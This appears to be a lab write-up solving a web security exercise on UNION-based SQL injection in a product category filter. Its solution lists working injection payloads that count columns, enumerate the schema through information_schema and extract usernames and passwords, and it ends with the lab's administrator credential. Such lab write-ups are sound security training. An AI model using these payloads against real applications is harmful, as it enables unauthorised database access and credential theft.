# Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.
# Solution
Firstly, verify how much the columns are:
```
' UNION SELECT null,null--
```
=> Get the needed response as the **Content-Length** is stark different -> required 2 columns.

Conduct DB enumeration:
- List all databases => **pg_catalog** database
```
cn' UNION select schema_name,null from INFORMATION_SCHEMA.SCHEMATA-- - 
```

- List all of tables on database => special table_name is **users_gfumla**
```
' UNION SELECT table_name,null FROM information_schema.tables
```

- List all of columns on database, get filtered by specified table.
```
' UNION SELECT column_name,table_name FROM information_schema.columns where table_name = 'users_gfumla'--
```

![](../../Image/Pasted%20image%2020250514083901.png)

=> There are 3 fields inside table.

- Select the specified fields
```
' UNION SELECT username_ncduwr,password_ivemif FROM users_gfumla-- -
```

![](../../Image/Pasted%20image%2020250514084547.png)

=> administrator:xojlln0vj9jwavs0ihxl